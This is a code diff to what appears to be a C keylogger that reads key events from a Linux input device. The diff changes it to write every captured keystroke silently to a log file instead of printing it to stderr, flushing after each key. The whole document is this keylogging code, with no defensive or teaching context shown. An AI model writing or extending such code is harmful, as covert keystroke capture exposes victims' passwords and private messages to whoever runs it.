@@ -66,6 +66,13 @@ int main(int argc, char *argv[]) {
         exit(1);
     }    
 
+    FILE *fp = fopen(LOGFILE, "a+");
+    if (!fp){
+        perror("ERROR: Failed to open log file!");
+        exit(1);
+    }
+
+
     /*Get keys pressed by the user*/
     while(1) {
         read(fd, &input_ev, sizeof(struct input_event));
@@ -86,12 +93,17 @@ int main(int argc, char *argv[]) {
             }
             else {
                 if(!shift_check)
-                    fprintf(stderr, "%s\n", key_map[input_ev.code][0]);
+                    fprintf(fp, "%s", key_map[input_ev.code][0]);
                 else
-                    fprintf(stderr, "%s\n", key_map[input_ev.code][1]);
+                    fprintf(fp, "%s", key_map[input_ev.code][1]);
+                    
+                fflush(fp);
             }
         }
     }
+
+    fclose(fp);
     close(fd);
+    
     return 0;
 }
